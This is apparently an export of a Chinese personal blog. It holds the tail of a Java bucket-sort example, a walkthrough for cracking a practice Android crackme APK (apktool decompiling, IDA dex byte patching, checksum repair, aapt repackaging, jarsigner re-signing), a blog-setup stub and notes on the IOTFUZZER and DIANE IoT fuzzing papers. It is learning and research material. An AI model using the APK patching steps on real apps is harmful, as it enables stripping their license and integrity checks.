bucketCounts[bucketIndex]++;</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="comment">// 将桶中元素获取出来，放到原数组中</span></span><br><span class="line">         <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">         <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; bucket.length; i++) &#123;</span><br><span class="line">             <span class="keyword">if</span> (bucketCounts[i] == <span class="number">0</span>) &#123;</span><br><span class="line">                 <span class="comment">// 空桶</span></span><br><span class="line">                 <span class="keyword">continue</span>;</span><br><span class="line">             &#125;</span><br><span class="line">             <span class="comment">// 将桶中的数据全部放回原本的数组</span></span><br><span class="line">             <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; bucketCounts[i]; j++) &#123;</span><br><span class="line">                 arr[index++] = bucket[i][j];</span><br><span class="line">             &#125;</span><br><span class="line">             <span class="comment">// 记录桶的元素的数组个数清空</span></span><br><span class="line">             bucketCounts[i] = <span class="number">0</span>;</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>code</category>
        <category>算法</category>
      </categories>
      <tags>
        <tag>code</tag>
      </tags>
  </entry>
  <entry>
    <title>破解第一个Android程序</title>
    <url>/2022/04/16/%E7%A0%B4%E8%A7%A3%E7%AC%AC%E4%B8%80%E4%B8%AAAndroid%E7%A8%8B%E5%BA%8F/</url>
    <content><![CDATA[<h1 id="使用IDA进行破解分析"><a href="#使用IDA进行破解分析" class="headerlink" title="使用IDA进行破解分析"></a>使用IDA进行破解分析</h1><ul>
<li>查找分析点<ol>
<li>使用apktool反编译apk<ul>
<li><code>Apktool_2.6.1.jar d app-release.apk -o outputdir</code></li>
</ul>
</li>
<li>查看资源文件中的string.xml</li>
<li>寻找相关的字符串对应的id号 比如 “unsuccessed”</li>
</ol>
</li>
<li>使用7z直接解压缩目标APK</li>
<li>提取其中的dex文件</li>
<li>载入ida</li>
<li>使用关键字搜索 ALT T 来搜索上面找到的id号</li>
<li>简单分析程序，然后修改dex文件<ul>
<li>edit - patch program -&gt; change byte -&gt; apply patches to input file</li>
</ul>
</li>
</ul>
<span id="more"></span>

<h1 id="使用dex2jar工具对dex文件进行修复"><a href="#使用dex2jar工具对dex文件进行修复" class="headerlink" title="使用dex2jar工具对dex文件进行修复"></a>使用dex2jar工具对dex文件进行修复</h1><p>主要是修复dex文件中的这两个字段：（checksum、signature）。也可以使用dexfixter工具</p>
<ul>
<li><code>d2j-dex-recompute-checksum.bat classes.dex -o</code></li>
</ul>
<p>替换apk里面的dex文件为修复之后的文件</p>
<ul>
<li>删除文件：<ul>
<li><code>.\aapt r D:\tools\android\apks\crackme02.apk classes.dex</code></li>
</ul>
</li>
<li>替换文件：<ul>
<li><code>.\aapt a D:\tools\android\apks\crackme02.apk d:\tools\android\apks\classes.dex</code></li>
</ul>
</li>
</ul>
<h1 id="签名"><a href="#签名" class="headerlink" title="签名"></a>签名</h1><blockquote>
<p>签名之前需要将之前的apk文件里面原来的签名文件删除 </p>
<p>即删除 META-INF文件夹</p>
</blockquote>
<ul>
<li><code>jarsigner -keystore d:\android\android.jks -signedjar crackme02signed.apk crackme02.apk android</code></li>
<li>其中Android.jks是由AS自动生成的签名文件，android是证书名称</li>
</ul>
]]></content>
      <categories>
        <category>Android安全</category>
        <category>工具</category>
      </categories>
      <tags>
        <tag>Android安全</tag>
        <tag>破解程序</tag>
      </tags>
  </entry>
  <entry>
    <title>配置自己的个人博客 github + hexo</title>
    <url>/2022/03/18/%E9%85%8D%E7%BD%AE%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%20github%20+%20hexo/</url>
    <content><![CDATA[<h1 id="配置自己的个人博客-github-hexo"><a href="#配置自己的个人博客-github-hexo" class="headerlink" title="配置自己的个人博客 github + hexo"></a>配置自己的个人博客 github + hexo</h1><p>基本教程：</p>
<p><a href="https://zhuanlan.zhihu.com/p/26625249">https://zhuanlan.zhihu.com/p/26625249</a></p>
<span id="more"></span>



]]></content>
      <tags>
        <tag>next</tag>
      </tags>
  </entry>
  <entry>
    <title>模糊测试相关论文笔记</title>
    <url>/2021/07/25/%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95%E7%9B%B8%E5%85%B3%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="1-IOTFUZZER-Discovering-Memory-Corruptions-in-IoT-Through-App-based-Fuzzing"><a href="#1-IOTFUZZER-Discovering-Memory-Corruptions-in-IoT-Through-App-based-Fuzzing" class="headerlink" title="1.IOTFUZZER: Discovering Memory Corruptions in IoT Through App-based Fuzzing"></a>1.IOTFUZZER: Discovering Memory Corruptions in IoT Through App-based Fuzzing</h1><h2 id="摘要："><a href="#摘要：" class="headerlink" title="摘要："></a>摘要：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Existing binary analysis based approaches only work on firmware, which is less accessible except for those equipped with special tools for extracting the code from the device.</span><br><span class="line">现有的二进制分析的方法只能在固件上面工作，但是除了配备特殊工具的设备外，固件的获取具有一定的难度。</span><br><span class="line"> IOTFUZZER：自动fuzzing框架，目的是查找物联网设备中的内存损坏漏洞（不需要获取其固件镜像）</span><br><span class="line"> </span><br><span class="line">The key idea ：most IoT devices are controlled through their official mobile apps, and such an app often contains rich information about the protocol it uses to communicate with its device. </span><br><span class="line">主要思想：大多数的物联网设备是由APP控制的，这些APP中有与其交互的各种协议</span><br><span class="line"></span><br><span class="line"> Therefore, by identifying and reusing program-specific logic (e.g., encryption) to mutate the test case (particularly message fields), we are able to effectively probe IoT targets without relying on any knowledge about its protocol specifications. </span><br><span class="line"> 通过识别和重用APP特定的逻辑来变异测试用例，我们就可以有效得探测物联网目标，而不依赖于任何关于其协议规范的知识</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<h2 id="主要思想："><a href="#主要思想：" class="headerlink" title="主要思想："></a>主要思想：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A unique property of IOTFUZZER is that it runs a protocol-guided fuzz and utilizes the information carried by the IoT app without reverse-engineering the protocol or explicit recovering such knowledge from the app, as prior approaches [20], [10] do. </span><br><span class="line">协议引导并且利用APP携带的信息</span><br><span class="line"></span><br><span class="line">it performs a dynamic analysis to identify the content inside the app that forms the messages to be delivered to the target device, and automatically mutates such content during the runtime so as to use the app’s program logics to produce meaningful test cases for probing the target firmware.</span><br><span class="line">利用动态执行来识别程序内部传递到目标设备的内容，并且自动变异这些内容</span><br></pre></td></tr></table></figure>

<h2 id="主要贡献："><a href="#主要贡献：" class="headerlink" title="主要贡献："></a>主要贡献：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">	•New framework. We present the first firmware-free fuzzing framework, IOTFUZZER, for security analysis of IoT devices. By utilizing the information carried by official mobile apps and their program logics, IOTFUZZER could automatically detect memory corruption vulnerabilities in IoT devices without direct access to the firmware.</span><br><span class="line">	• New techniques. We developed a set of new techniques to enable an automatic, blackbox IoT fuzzer, which includes protocol-guided fuzzing without protocol specifications, in-context cryptographic and networking function replay for message generation and delivery, and a lightweight mechanism to remotely monitor the target IoT device’s status.</span><br><span class="line">	• Implementation and findings. We implemented a full-featured prototype of IOTFUZZER and evaluated it</span><br><span class="line">over 17 real-world IoT devices. Our study discovered 15 security-critical memory vulnerabilities, with 8 of them never reported before.</span><br><span class="line">	新框架：利用官方APP携带的信息和逻辑，IOTFUZZER自动检测内存损坏漏洞，而不需要获取固件</span><br><span class="line">	新技术：自动黑盒物联网fuzz工具，协议指导，消息生成和传递上下文加密和网络功能重放以及远程监控，轻量级</span><br><span class="line">	评估	</span><br></pre></td></tr></table></figure>

<h2 id="所面临的挑战"><a href="#所面临的挑战" class="headerlink" title="所面临的挑战"></a>所面临的挑战</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Challenges. Therefore, in order to generate fuzzing messages without making assumptions on protocol formats, we need to solve the following challenges.</span><br><span class="line">	• Challenge 1: Mutating fields in networking messages. Therefore, we need to automatically recognize and fuzz the protocol fields for unknown protocols.</span><br><span class="line">	我们需要自动识别和协议的字段信息等。</span><br><span class="line">	• Challenge 2: Handling encrypted messages. Thus, we need a lightweight and flexible</span><br><span class="line">solution to reuse the message encryption functions in the app.</span><br><span class="line">	需要一个轻量级的解决方法来重用在APP里面的加密函数</span><br><span class="line">	• Challenge 3: Monitoring crashes. In order to identify the system crash and the corresponding probing message that triggers the crash, we need to design an effective mechanism to remotely and automatically monitor the device status.</span><br><span class="line">	为了检测崩溃，我们需要设计一个远程检测设备状态的机制</span><br><span class="line">	</span><br></pre></td></tr></table></figure>

<h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">	• Mutating protocol fields at data sources. Since protocol reverse engineering for unknown protocols is expensive, we can mutate the data which is used in the protocol message (note that most of these data</span><br><span class="line">will be strings) at their sources (e.g., at data definition sites or some data use sites such as when passed as arguments to functions). Then correspondingly, following the original program logic, these mutated strings will eventually become protocol fields.</span><br><span class="line">	在数据源处变异协议的各个字段</span><br><span class="line">	• Reusing cryptographic functions at runtime. Since we have modified the data sources at the very be-</span><br><span class="line">ginning, the normal program execution will help us complete the message encryption procedure and gen-</span><br><span class="line">erate ready-to-send messages. Therefore, we do not need to re-implement the complete encryption logic</span><br><span class="line">out-of-the-box.</span><br><span class="line">	在APP运行时重用APP里面的加密函数：就不用逆向出具体的加密函数了</span><br><span class="line">	• Detecting liveness with heartbeat mechanism. Though we cannot monitor the status of the running</span><br><span class="line">device locally, we can infer whether the program or the system is alive by sending a heartbeat message. The heartbeat message can be any messages that query the status of the device.</span><br><span class="line">	使用heartbeat机制来检测设备的状态：心跳机制是一种检测故障的机制</span><br><span class="line">	也就是向设备发送一个消息，如果设备正常，设备会怎么样，设备不正常又会怎么样。</span><br></pre></td></tr></table></figure>

<h2 id="框架"><a href="#框架" class="headerlink" title="框架"></a>框架</h2><p><img src="C:\Users\fourth\AppData\Roaming\Typora\typora-user-images\image-20210729161035679.png" alt="image-20210729161035679"></p>
<p>具体来说有四个步骤：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1) UI analysis: In the first step, the goal is to analyze the code of IoT app and discover all UI components that will lead to the sending of networking messages. With such information, we can trigger message sending events by driving the corresponding UI controls. The purpose of UI analysis is to facilitate data-flow analysis and fuzzing in the following steps.</span><br><span class="line">2) Data-flow analysis: In order to identify the program elements (e.g., string constant, input from system APIs, etc.) whose values are related to the content of the message to be sent to the IoT device, we track the data flows from a set of selected elements (Section III-B) to find those indeed affecting some message fields. Those program elements are then used to mutate the content of the fields for fuzzing the device. Note that unlike taint-based fuzzers [7], [28] looking for the inputs of a program that can reach a known vulnerable function (e.g., printf) inside the program, our approach utilizes the data-flow analysis to determine how to command the IoT app to generate meaningful test outputs for fuzzing its remote target. </span><br><span class="line">3) Runtime mutation: Once the protocol fields are recognized, according to the fuzzing policy we defined, IOTFUZZER mutates the original fields (e.g., original string) at their first use sites. Then, the IoT app will follow its normal execution logic to compute and build the message and send it to IoT device with the mutated data.</span><br><span class="line">4) Response monitoring: The final step is to monitor the running status of IoT device remotely and capture the triggered crash. For TCP-based communication, the connection between the IoT app and the IoT device will be interrupted, which is easy to detect. For UDP-based communication, we use a heartbeat mechanism to detect the crashes occurred at uncertain times.</span><br><span class="line"></span><br><span class="line">1）UI分析：分析应用程序的代码，确定最终可以导致消息传递的UI组件。</span><br><span class="line">2）数据流分析：确定如何命令APP生成有意义的输入，追踪一组选定元素的数据流，以找到确实影响某些消息字段的元素（如，字符串常量、系统API输入等）</span><br><span class="line">3）运行时变异：根据定义的模糊策略，IOTFUZZER会在其首次使用的地方对原始字段进行变异。然后APP将遵循其正常执行逻辑来计算和构建消息，并将其与变异数据一起发送到物联网设备</span><br><span class="line">3）检测响应：基于UDP的通信，我们使用心跳机制来检测目标设备的状态</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>UI分析</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">构造call path：</span><br><span class="line">	使用Androguard 构建APP的调用图，从目标网络通信api开始，构建了到UI事件处理程序（event handlers）的反向代码路径。隐式控制流转换及其他事件驱动的调用，使用EdgeMiner 获取。代码路径的接收器是一组最终发送网络信息的时间处理器</span><br><span class="line">	</span><br><span class="line">activity转换图构造：</span><br><span class="line">	为了在fuzzing中到达特定的activity并且触发网络发送事件</span><br><span class="line">	使用Monkeyrunner 根据事件的执行顺序，通过简单的策略与每个activity中的UI元素进行交互。我们就可以获得一些列的UI event和触发他们的顺序。我们也记录了activity之间的转换。我们根据call path 过滤掉不会触发消息发送的event.转移图的节点是具有触发消息发送API的事件的activity，边是创建或恢复activity的事件</span><br></pre></td></tr></table></figure>

<p>数据流分析：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">	为了在执行阶段变异协议的字段，我们需要识别协议的字段，和使用协议字段作为参数的函数。</span><br><span class="line">	command message通常是由硬编码字符串，用户输入或者系统API构成，我们使用TaintDroid的修改版本动态污点分析来识别他们。</span><br><span class="line">	在第一个使用消息的位置上对消息进行变异，就不用设置消息的格式了，所以记录了将受污染数据作为参数的函数，以便找到这个位置</span><br><span class="line">	我们不会将污点传播到加密函数，首先我们执行加密函数标识，然后将其中一个污点接收器设置为这些加密函数的参数</span><br><span class="line">	</span><br><span class="line">	污点来源：APP中的所有字符串、消息中常用的系统API（如WifiInfo.getMacAddress(),Location.getLatitude(), Location.getLongitude()),以及来自UI的用户输入(例如，EditText.getText()）</span><br><span class="line">	</span><br><span class="line">	污点传播：修改传播规则，扩大更多的污点源。使用字典来存储污点标签，每当创建一个新的标签时，就将其添加到字典中，并追踪这个标签的依赖关系。</span><br><span class="line">	污点接收器：这个是我们识别网络API和加密功能中使用的数据。</span><br><span class="line">	</span><br><span class="line">识别加密函数：</span><br><span class="line">	由于加密算法通常包含算术和位操作。我们选择包含这两种运算的函数，然后记录消息发送事件的执行轨迹，并基于相对于网络函数的位置来细化我们的候选函数。</span><br></pre></td></tr></table></figure>

<p>运行 时变异：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">	动态hook之前记录的函数，并在运行时变异协议字段参数以生成探测消息</span><br><span class="line">好处：</span><br><span class="line">	1.协议字段在编码或者加密之前就可以模糊化</span><br><span class="line">	2.不需要逆向工程就可以知道未知协议领域的fuzzing</span><br><span class="line">	</span><br><span class="line">	使用Xposed框架来hook之前我们得到的函数（需要上下文相关：只有在特定的上下文环境下才会被触发）。之后原始数据就可以被变异之后的值代替传递到hook函数</span><br><span class="line">	注意：如果一个协议字段被传递给几个hook函数，他可能会被模糊化几次，并且同一个函数可能会被hook来模糊化几个协议字段。</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\fourth\AppData\Roaming\Typora\typora-user-images\image-20210730110451403.png" alt="image-20210730110451403"></p>
<p>因为我们每次变异协议的时候，不能变异所有的字段（容易被设备拒绝），只能变异字段的一个子集</p>
<p><img src="C:\Users\fourth\AppData\Roaming\Typora\typora-user-images\image-20210730111053438.png" alt="image-20210730111053438"></p>
<h2 id="fuzzing-policy"><a href="#fuzzing-policy" class="headerlink" title="fuzzing policy"></a>fuzzing policy</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1) Changing the lengths of strings for stack-based or heap-based overflow and out-of-bound access. In our implementation, IOTFUZZER duplicates the original strings several times (from dozens to thousands) or appends a variable number of character &quot;A&quot; to the original string to construct malformed messages.</span><br><span class="line">更改基于堆栈或者基于堆溢出和越界访问的字符串的长度</span><br><span class="line">2) Changing the integer , double or float values for integer overflow and out-of-bound access. Therefore, we mutate the original values into boundary cases and very-large values. Also, to trigger the cases of miscounting of boundary conditions, we also generate the off-by-one values for potential off-by-one error.</span><br><span class="line">更改整数，双精度，或者浮点数的值来造成整数溢出和越界访问。</span><br><span class="line">3) Changing the types, or providing empty values for misinterpretation of the value and uninitialized variable vulnerability. For example, if a string value is replaced with an integer value, a null pointer dereference may be triggered (as the case of Section IV -E1).In the implementation of IOTFUZZER, we mutate the types of Object at the Java level of Android apps</span><br><span class="line">更改类型，或者提供空值为了错误解释值和未初始化变量漏洞</span><br></pre></td></tr></table></figure>

<p>Response Monitoring</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">	1) Expected Response. In this case, the probing messages are handled properly by the IoT device, and</span><br><span class="line">no exception occurs. Such a situation is out of our interests.</span><br><span class="line">	预期的响应：没有任何错误发生</span><br><span class="line">	2) Unexpected Response. The probing messages go beyond the intended logic of the program (e.g., reaching the input parameter boundary), and trigger untreated errors.</span><br><span class="line">	超出预期的响应：超出逻辑，触发未处理的错误</span><br><span class="line">	3) No Response. When no response is answered for a certain probing message, it may either trigger a DoS vulnerability, or it is just an error handled locally without replying, or running in a dead loop.</span><br><span class="line">	无响应：可能是DOS漏洞、在设备端处理了错误、或者是一个的死循环</span><br><span class="line">	4) Disconnection. For connection-oriented communication protocol like TCP , the network connection will be interrupted when a system crash is triggered by the probing message.</span><br><span class="line">	断开连接：由于发送的探测消息导致了设备系统崩溃</span><br></pre></td></tr></table></figure>

<p>碰撞检测机制：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TCP连接：</span><br><span class="line">	查看连接的状态推断设备系统是否崩溃</span><br><span class="line">UDP连接：</span><br><span class="line">	心跳机制，首先我们从APP中提取心跳信息，用以检测设备是否处于活动状态</span><br><span class="line">	在fuzzing过程中，每隔10个探测信息就插入一个心跳消息</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">某些已确认的崩溃是由相同的种子产生的变异消息所触发的，所以作者还记录了每个种子和变异消息对的关系。</span><br></pre></td></tr></table></figure>

<h2 id="局限："><a href="#局限：" class="headerlink" title="局限："></a>局限：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">本文主要的焦点是从移动应用的数据输入通道自动识别内存损坏漏洞，但是对于其他类型的漏洞无能为力。</span><br><span class="line">并不能给出产生内存损坏漏洞的根本原因和类型</span><br><span class="line">本文是没有考虑有云的情况的。可能云会发出警报。</span><br></pre></td></tr></table></figure>

<h1 id="2-DIANE-Identifying-Fuzzing-Triggers-in-Apps-to-Generate-Under-constrained-Inputs-for-IoT-Devices"><a href="#2-DIANE-Identifying-Fuzzing-Triggers-in-Apps-to-Generate-Under-constrained-Inputs-for-IoT-Devices" class="headerlink" title="2. DIANE: Identifying Fuzzing Triggers in Apps to Generate Under-constrained Inputs for IoT Devices"></a>2. DIANE: Identifying Fuzzing Triggers in Apps to Generate Under-constrained Inputs for IoT Devices</h1><h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">However , due to the difficulties in extracting and emulating custom firmware, black-box fuzzing is often the only viable analysis option. Unfortunately, this solution mostly produces invalid inputs, which are quickly discarded by the targeted IoT device and do not penetrate its code. </span><br><span class="line">固件获取困难，但是传统的黑盒测试会产生很多无意义的输入</span><br><span class="line">Another proposed approach is to leverage the companion app (i.e., the mobile app typically used to control an IoT device) to generate well-structured fuzzing inputs. Unfortunately, the existing solutions produce fuzzing inputs that are constrained by app-side validation code, thus significantly limiting the range of discovered vulnerabilities.</span><br><span class="line">从官方的APP端进行fuzzing，APP端对输入的验证会限制fuzzing的效率。</span><br><span class="line"></span><br><span class="line">Our key observation is that there exist functions inside the companion app that can be used to generate optimal (i.e., valid yet under-constrained) fuzzing inputs. fuzzing triggers：are executed before any data-transforming functions (e.g., network serialization), but after the input validation code. </span><br><span class="line">fuzzing triggers：在数据传输函数之前执行，在输入验证函数之后执行</span><br><span class="line">DIANE： a tool that combines static and dynamic analysis to find fuzzing triggers in Android companion apps, and then uses them to fuzz IoT devices automatically. </span><br><span class="line">DIANE：就是一个结合静态分析和动态分析来找到fuzzing triggers，以便于使用他们来进行fuzzing物联网设备的工具</span><br></pre></td></tr></table></figure>

<p>思考：万一验证端在设备上怎么办？</p>
<h2 id="主要思想：-1"><a href="#主要思想：-1" class="headerlink" title="主要思想："></a>主要思想：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">i) fuzzing triggers identification, and </span><br><span class="line">ii) fuzzing. </span><br><span class="line">To do this, first, we automatically retrieve those functions within an app that send data to the IoT device.</span><br><span class="line">首先需要自动检测出APP中涉及到发送数据到物联网设备的函数</span><br><span class="line">Then, for each of these functions, we build an inter-procedural backward slice, which we dynamically analyze to ultimately identify fuzzing triggers. </span><br><span class="line">对于每一个上面检测到的函数，我们做一个过程向后切片，这样可以帮助我们动态识别fuzzing triggers</span><br><span class="line">Finally, we use dynamic instrumentation to repeatedly invoke these fuzzing triggers using different arguments. This generates a stream of network data that fuzzes the functionality of the IoT device, to ultimately spot vulnerabilities.</span><br><span class="line">最后我们使用动态的机制来使用不同的参数重复调用这些fuzzing trigger。这样会产生网络数据流（可以功能性得fuzzing物联网设备）</span><br></pre></td></tr></table></figure>

<h2 id="本文做出的贡献："><a href="#本文做出的贡献：" class="headerlink" title="本文做出的贡献："></a>本文做出的贡献：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">• We propose an approach to identify fuzzing triggers, which are functions that, in the app’s control flow, are located between the app-side validation logic and the data-encoding functions. When executed, the identified fuzzing triggers produce valid yet under-constrained inputs, enabling effective fuzzing of IoT devices.</span><br><span class="line">可以识别出fuzzing trigger：在APP的控制流层面是位于APP内部逻辑验证和数据编码函数之间的</span><br><span class="line">• We leverage our approach to implement DIANE, an automated black-box fuzzer for IoT devices. </span><br><span class="line">是一个黑色测试工具，来测试物联网设备</span><br><span class="line">   • We evaluate our tool against 11 popular, real-world IoT devices. In our experiments, we show that by identifying fuzzing triggers and using them to generate inputs for the analyzed devices, we can effectively discover vulnerabilities. Specifically, we found 11 vulnerabilities in 5 different devices, 9 of which were previously unknown.</span><br><span class="line">   评估有效</span><br><span class="line">• We show that, for a majority of IoT devices and companion apps, identifying and leveraging fuzzing triggers is essential to generate bug-triggering inputs.</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\fourth\AppData\Roaming\Typora\typora-user-images\image-20210730201732830.png" alt="image-20210730201732830"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">On the one hand, if the fuzzed function is too close to the UI, the fuzzing is ineffective due to app-side validation that might be present later in the execution. </span><br><span class="line">On the other hand, picking a function too close to the point where data is put onto the network might be ineffective.</span><br><span class="line"></span><br><span class="line">总之，fuzzing入口点（fuzzing trigger）不能离输入太近，也不能离发送数据太近。</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">寻找fuzzing trigger： </span><br><span class="line"> 	i) static call-graph analysis, </span><br><span class="line"> 	ii) network traffic analysis, </span><br><span class="line"> 	iii) static data-flow analysis,and </span><br><span class="line"> 	iv) dynamic analysis of the function arguments.</span><br><span class="line"> 	</span><br><span class="line"> 	uses a “bottom-up” approach. </span><br><span class="line"> 	Specifically, we start from identifying low-level functions that potentially generate network traffic, </span><br><span class="line"> 	and then we progressively move “upward” in the app call-graph (i.e., from low-level networking functions to high-level UI-processing ones). This approach allows us to identify functions that produce valid yet under-constrained inputs, skipping all the sanitization checks performed by data-processing functions.</span><br><span class="line"> 	We then use these functions, which we call fuzzing triggers, to efficiently fuzz the analyzed IoT device, while monitoring it for anomalous behaviors, which indicate when a bug is triggered.</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\fourth\AppData\Roaming\Typora\typora-user-images\image-20210730204946092.png" alt="image-20210730204946092"></p>
<h2 id="Fuzzing-Trigger-Identification："><a href="#Fuzzing-Trigger-Identification：" class="headerlink" title="Fuzzing Trigger Identification："></a>Fuzzing Trigger Identification：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">We consider the first data-transforming function in the trace a valid fuzzing trigger, as it dominates every other data-transforming function (itself included).</span><br><span class="line">第一个数据转换函数为fuzzing trigger</span><br><span class="line"></span><br><span class="line">Our bottom-up Fuzzing Trigger Identification algorithm is composed of four steps: </span><br><span class="line"></span><br><span class="line">i) sendMessage Candidates Identification,</span><br><span class="line">ii) sendMessage Validation, 	</span><br><span class="line">iii) Data-Transforming Function Identification, and 	</span><br><span class="line">iv) Top-Chain Functions Collection.	</span><br></pre></td></tr></table></figure>

<p>​    i) sendMessage Candidates Identification：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">		statically analyzing the companion app. We aim at finding all the border methods that might implement the network interactions with the analyzed IoT device (function getBorderMethods in Algorithm 1). Specifically, we collect all the methods that perform (at least) a call to native functions or a</span><br><span class="line">call to methods in the Android framework that implement network I/O functionality (see Appendix A for more details).</span><br><span class="line">		静态分析</span><br><span class="line">		候选消息发送函数（border function）：在java函数和native层之间交换的，用于发送数据的函数；或者是在安卓框架中实现了网络信息发送的函数</span><br></pre></td></tr></table></figure>

<p>​    ii) sendMessage Validation：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">		First, we dynamically hook all the candidate functions and run the app. When we observe network activity, we register the last executed candidate sendMessage function. （运行APP，记录最后执行的候选消息发送函数）</span><br><span class="line">		In particular, each time a candidate sendMessage function is executed, we collect the elapsed time between its execution and the observed network activity. （记录执行的时间（从开始执行到观察到网络活动为止））</span><br><span class="line">		Then, we leverage the K-mean algorithm to cluster the observed elapsed time measures. Specifically, we group our candidates into two clusters (i.e., k=2). To do so, we compute each feature vector as the mean, standard deviation, and mode of the elapsed times of each candidate. The rationale is that functions that cause network activity have a smaller mean and standard deviation, as they are less</span><br><span class="line">affected by noise. </span><br><span class="line">		（使用K-means算法对观察到的时间进行聚类，K=2,特征为：均值、标准差和每个候选人的经过时间模式。主要是因为理想的候选人的观察时间应该有很小的均值和标准差，并且噪音对他们的影响并不大）</span><br><span class="line">		Finally, among the sendMessage candidates, we select those belonging to the cluster having the smallest mean of the elapsed times. Only the sendMessage functions within this cluster will be considered in the subsequent steps of our analysis. This approach is represented by the function dynamicFilter in Algorithm 1.</span><br></pre></td></tr></table></figure>

<p>​    iii) Data-Transforming Function Identification：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">We first statically identify the possible variables that hold the data being sent by the considered sendMessage function, and the code locations where these variables might be set in the app (function getArgAndObjLocs in Algorithm 1). </span><br><span class="line">静态分辨出sendmessage函数发送的可能的变量，并且找到设置这些变量的位置</span><br><span class="line">To achieve this, we create a set S_v containing tuples (v,cl), where v is a variable used by the sendMessage (i.e., sendMessage arguments or objects referenced within the sendMessage body), and cl is the code location where v is set.	</span><br><span class="line">创建一个集合，集合中的元素都是元组（v,cl）</span><br><span class="line"></span><br><span class="line">For each tuple (v,cl)∈S_v, we perform a static inter-procedural backward slicing (Line 6 in Algorithm 1) from cl up to any function retrieving values from any UI objects. Then, we divide the computed program slices in function scopes (getFunctionScopesat Line 7). Given a program slice, a function scope is defined as a subsequence inst_f of sequential instructions in the slice that belong to the same function f.</span><br><span class="line">对于每一个元组，我们执行一个静态的向后切片，从cl到任何函数（这个函数接受了从UI中的数据），然后将计算出的程序片段划分到函数范围中。给定一个程序切片，函数范围就是切片中属于同一函数f的连续指令的子序列</span><br><span class="line"></span><br><span class="line">For each collected function scope, we perform a liveness analysis [63]: We consider the variables (i.e., local variables and class fields) referenced within the function scope, and we compute the set Lifof variables that are live at the beginning of the scope, and the set Lo_f variables that are live at the end of the scope(Line 8).</span><br><span class="line">对于每一个函数域（FunctionScope），我们对其进行活性分析（liveness analysis）,考虑函数作用域内部应用的变量（局部变量和类的字段），并计算Li_f：在函数域开头的活跃变量集合，Lo_f:生存在函数域结束的活动变量集合</span><br><span class="line">换句话说， 𝐿𝑖_𝑓中包含的是函数𝑓中用于数据转换的所有数据（包括𝑓的参数、𝑓中在赋值前被读取过的类字段）， 𝐿𝑜_𝑓中包含的是函数𝑓生成后的数据（包括𝑓的返回值、𝑓中新建或修改过的类字段）。</span><br><span class="line"></span><br><span class="line">To identify data-transforming functions, we leverage the observation that these functions increase the entropy of the data they consume</span><br><span class="line">为了识别data-transforming function,我们利用了这些函数增加了他们消耗的数据的信息熵的这一现象（数据转换函数的输入和输出具有较大的信息熵差别）。因此先hook每个FunctionScope对应的函数，然后在执行app的过程中动态计算𝐿𝑖_𝑓和𝐿𝑜_𝑓中每个变量的信息熵，并将结果保存到对应的变量中。</span><br><span class="line"></span><br><span class="line">Finally, we inspect every collected function scope and calculate the quotient debetween the maximum entropy registered among all the variables in Lofand the minimum value of entropy registered among all the variables in Lif(Line 11). If deis greater than a certain threshold Tf(set to 2.0 in our experiments, as previous work suggested [80]), we consider the function f to be a data-transforming function (Line 12).</span><br><span class="line">对每个FunctionScope，从𝐿𝑜_𝑓中选取最大熵值，从𝐿𝑖_𝑓中选取最小熵值，二者相除得到𝑑_𝑒。这个值表示该函数的信息熵值变化情况，如果𝑑_𝑒大于一定阈值（文章中是2.0），则说明该函数进行了数据散列变化，因此将其选为Data- ransforming函数。</span><br></pre></td></tr></table></figure>

<p>​    iv) Top-Chain Functions Collection.    </p>
